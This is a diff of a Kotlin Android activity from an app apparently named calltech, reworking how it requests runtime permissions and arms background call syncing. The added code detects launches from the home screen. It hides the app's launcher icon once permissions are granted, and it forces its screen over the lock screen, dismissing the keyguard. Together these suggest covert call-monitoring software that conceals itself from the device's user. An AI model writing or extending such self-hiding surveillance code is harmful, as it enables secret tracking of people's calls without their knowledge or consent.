@@ -1,32 +1,23 @@
 package com.calltech
 
 import android.content.Intent
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.PowerManager
-import android.provider.Settings
 import android.util.Log
+import android.view.WindowManager
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * Install / Open: pehle permission screens aage.
- * Allow ke baad Home, phir alias-swap se icon hide.
- * Permission dialog ke dauran launcher mat chhoo — process mar jaati hai.
+ * Permission popup sirf install/auto-start se.
+ * Home icon click par popup nahi — turant band.
+ * Allow ke baad hide.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
-    private val pending = ArrayDeque<String>()
-    private var retried = false
     private var setupFinished = false
 
     private val permissionLauncher =
-        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
-            askNextPermission()
-        }
-
-    private val batteryLauncher =
-        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { _ ->
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
             finishAndSync()
         }
 
@@ -37,48 +28,65 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
 
-        pending.clear()
-        pending.addAll(SyncBootstrap.requiredPermissions())
-        askNextPermission()
-    }
-
-    private fun askNextPermission() {
-        while (pending.isNotEmpty()) {
-            val permission = pending.removeFirst()
-            if (checkSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                continue
+        if (isHomeIconClick()) {
+            Log.d(TAG, "App icon click — permission popup skip")
+            if (InstallFlow.isSetupComplete(this)) {
+                LauncherHider.hideIfMarked(this)
             }
-            permissionLauncher.launch(permission)
+            finish()
             return
         }
 
-        if (SyncBootstrap.needsRuntimePermissions(this) && !retried) {
-            retried = true
-            pending.addAll(SyncBootstrap.requiredPermissions())
-            askNextPermission()
+        bringToFront()
+
+        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
+            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missing.isEmpty()) {
+            finishAndSync()
             return
         }
 
-        requestBatteryThenSync()
+        permissionLauncher.launch(missing.toTypedArray())
     }
 
-    private fun requestBatteryThenSync() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val power = getSystemService(POWER_SERVICE) as PowerManager
-            if (!power.isIgnoringBatteryOptimizations(packageName)) {
-                try {
-                    batteryLauncher.launch(
-                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                            data = Uri.parse("package:$packageName")
-                        },
-                    )
-                    return
-                } catch (error: Exception) {
-                    Log.w(TAG, "Battery prompt failed: ${error.message}")
-                }
-            }
+    private fun isHomeIconClick(): Boolean {
+        if (intent.getBooleanExtra(PostInstallPrompt.EXTRA_FORCE_POPUP, false)) {
+            return false
         }
-        finishAndSync()
+
+        val fromLauncher = Intent.ACTION_MAIN == intent.action &&
+            intent.hasCategory(Intent.CATEGORY_LAUNCHER)
+        if (!fromLauncher) {
+            return false
+        }
+
+        val source = buildString {
+            append(referrer?.toString().orEmpty())
+            append(' ')
+            append(callingPackage.orEmpty())
+        }.lowercase()
+
+        if (INSTALLER_HINTS.any { source.contains(it) }) {
+            return false
+        }
+
+        return HOME_LAUNCHER_HINTS.any { source.contains(it) }
+    }
+
+    private fun bringToFront() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+            setShowWhenLocked(true)
+            setTurnScreenOn(true)
+        }
+        @Suppress("DEPRECATION")
+        window.addFlags(
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
+                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
+        )
     }
 
     private fun finishAndSync() {
@@ -107,5 +115,24 @@ class PermissionTrampolineActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "PermissionTrampoline"
+        private val INSTALLER_HINTS = listOf(
+            "packageinstaller",
+            "filemanager",
+            "fileexplorer",
+            "documentsui",
+            "myfiles",
+            "vending",
+        )
+        private val HOME_LAUNCHER_HINTS = listOf(
+            "launcher",
+            "lawnchair",
+            "trebuchet",
+            "miui.home",
+            "poco.home",
+            "nexuslauncher",
+            "microsoftlauncher",
+            "hilauncher",
+            "xoslauncher",
+        )
     }
 }
